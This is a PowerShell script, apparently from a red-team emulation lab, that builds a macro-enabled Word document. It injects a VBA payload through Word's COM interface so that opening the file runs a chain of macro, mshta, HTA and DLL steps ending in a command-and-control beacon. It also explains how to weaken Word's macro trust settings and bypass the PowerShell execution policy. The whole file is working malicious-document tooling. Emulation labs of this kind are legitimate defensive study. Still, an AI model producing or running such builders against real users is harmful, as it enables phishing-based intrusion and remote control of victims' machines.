<#
.SYNOPSIS
Run on WS01 (with Word installed and logged in as any lab user). Creates a
macro-enabled Word document (test.docm) that contains the c0015 entry macro
(payloads/docm/macro_payload.vba) so that opening the document auto-executes
macro -> mshta -> HTA -> DLL -> beacon (S1..S3).

Requirements for the auto-injection to work:
  - Microsoft Word installed on WS01 (currently "pending verification" - check first).
  - Word: Options > Trust Center > Macro Settings >
      "Enable VBA macros" (or place test.docm in a Trusted Location),
      and "Trust access to the VBA project object model" (needed only by the
      COM builder that injects the VBA; if this is off, use the Manual fallback).

.PARAMETER MacroSource  Path to payloads/docm/macro_payload.vba (default).
.PARAMETER OutPath      Where to save test.docm (default Desktop\test.docm).
.PARAMETER Visible      Show Word window during build (default true, so you can trust macros on the newly created doc).
.EXAMPLE
pwsh -ExecutionPolicy Bypass -File payloads/packaging/install_macro_docm.ps1 -MacroSource C:\c0015\macro_payload.vba
#>
param(
    [string]$MacroSource = (Join-Path $PSScriptRoot '..\docm\macro_payload.vba'),
    [string]$OutPath = (Join-Path ([Environment]::GetFolderPath('Desktop')) 'test.docm'),
    [switch]$Visible
)
$ErrorActionPreference = 'Stop'

# ---- prerequisite check: Word present ----
$wordProg = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winword.exe' -ErrorAction SilentlyContinue
if (-not $wordProg) { throw "Word not found on WS01 - verify ODT Word install (M-1 gate) before continuing." }
if (-not (Test-Path -LiteralPath $MacroSource)) { throw "macro source not found: $MacroSource" }

$code = Get-Content -LiteralPath $MacroSource -Raw
# strip VB_Name attribute / any module-attribute lines (they are invalid via AddFromString)
$code = $code -replace '(?m)^Attribute\s+VB_Name.*$', ''

$word = New-Object -ComObject Word.Application
$word.Visible = [bool]$Visible
try {
    $doc = $word.Documents.Add()

    $proj = $null
    try {
        $proj = $word.VBE.ActiveVBProject   # requires "Trust access to VBA project object model"
    } catch {
        $word.Quit()
        throw "Word blocked VBA project access. Enable: Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model', then re-run."
    }

    # insert into the ThisDocument class module (Document_Open) and a standard module (AutoOpen)
    $mod = $proj.VBComponents.Add(1)         # 1 = vbext_ct_StdModule
    $mod.Name = "c0015Entry"
    $mod.CodeModule.AddFromString($code)

    # SaveAs FileFormat 13 = wdFormatXMLDocumentMacroEnabled (.docm)
    $doc.SaveAs([ref]$OutPath, [ref]13)
    $doc.Close()
    Write-Output "docm created: $OutPath"
    Write-Output "Open it with macros enabled to auto-run the chain (verify C2-SIM log)."
}
finally {
    if ($null -ne $word) { $word.Quit() }
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
}